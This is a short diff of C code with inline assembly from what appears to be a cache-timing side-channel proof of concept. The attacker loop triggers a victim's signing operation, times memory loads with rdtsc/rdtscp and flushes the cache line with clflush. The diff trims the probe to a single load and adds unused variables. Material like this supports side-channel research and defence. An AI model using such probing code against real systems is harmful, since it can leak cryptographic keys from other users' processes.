@@ -192,7 +192,9 @@ int main(int argc, char **argv)
 
 			// Request the victim to sign
 			sharestruct->sign_requested = victim_iteration_no;
-
+			register uint64_t time1, time2;
+			unsigned cycles_high, cycles_low, cycles_high1, cycles_low1;
+			unsigned int val=0;
 			// Start monitoring loop
 			for (i = 0; i < MAXSAMPLES; i++) {
 
@@ -218,29 +220,28 @@ int main(int argc, char **argv)
 						}
 					}
 				}
-
+				
 				asm volatile(
 					".align 32\n\t"
 					"lfence\n\t"
-					"rdtsc\n\t"					/* eax = TSC (timestamp counter)*/
+					"rdtsc\n\t"					// eax = TSC (timestamp counter)
 					// "shl $32, %%rdx\n\t"
 					// "or %%rdx, %%rax\n\t"
 					// "movq %%rax, %%r8\n\t"
-					"movl %%eax, %%r8d\n\t"		/* r8d = eax; this is to back up eax into another register */
-					"movq (%1), %1\n\t"			/* current = *current; LOAD */
-					"movq (%1), %1\n\t"			/* current = *current; LOAD */
-					"movq (%1), %1\n\t"			/* current = *current; LOAD */
-					"movq (%1), %1\n\t"			/* current = *current; LOAD */
-					"rdtscp\n\t"				/* eax = TSC (timestamp counter) */
+					"movl %%eax, %%r8d\n\t"		// r8d = eax; this is to back up eax into another register 
+					"movq (%1), %%rdx\n\t"			// current = *current; LOAD 
+					"rdtscp\n\t"				// eax = TSC (timestamp counter) 
 					// "shl $32, %%rdx\n\t"
 					// "or %%rdx, %%rax\n\t"
 					// "sub %%r8, %%rax\n\t"
-					"sub %%r8d, %%eax\n\t" 		/* eax = eax - r8d; get timing difference between the second timestamp and the first one */
-					"movl %%eax, %0\n\t" 		/* samples[i] = eax */
-					: "=rm"(samples[i]), "+rm"(current) /* output */
+					"sub %%r8d, %%eax\n\t" 		// eax = eax - r8d; get timing difference between the second timestamp and the first one 
+					"movl %%eax, %0\n\t" 		// samples[i] = eax 
+					: "=rm"(samples[i]), "+rm"(current) // output 
 					:
 					: "rax", "rcx", "rdx", "r8", "memory");
+				
 				_mm_clflush(current);
+
 			}
 
 			// Check that the victim's iteration of interest is actually ended
